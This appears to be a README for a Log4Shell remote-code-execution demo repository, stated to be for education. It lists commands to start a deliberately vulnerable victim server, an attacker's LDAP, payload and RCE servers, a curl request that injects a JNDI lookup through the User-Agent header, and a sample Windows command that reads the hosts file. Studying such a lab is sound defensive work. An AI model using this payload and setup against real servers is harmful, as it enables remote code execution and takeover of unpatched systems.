# log4Shell
log4Shell vulnerability RCE sample

**NOTE**

This repo is only for educational purposes only

---


## Run victim web server (app)
```
gradlew build
java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar build\libs\app-0.0.1.jar
```

## Run attacker malicious ldap server (ldap)
```
gradlew build
java -jar build\libs\ldap-1.0.0.jar http://localhost:8081/#Payload 636
```

## Run attacker java class payload server
```
gradlew build
java -jar build\libs\payload-1.0.0.jar
```

## Run attacker rce server (rce)
```
gradlew build
java -jar build\libs\rce-1.0.0.jar

```

## Do the attacker
```
curl http://localhost:8080/ -H 'User-Agent:${jndi:ldap://0.0.0.0:636/a}'
```

## Sample command on windows
```
cmd /C more c:\windows\system32\drivers\etc\hosts
```

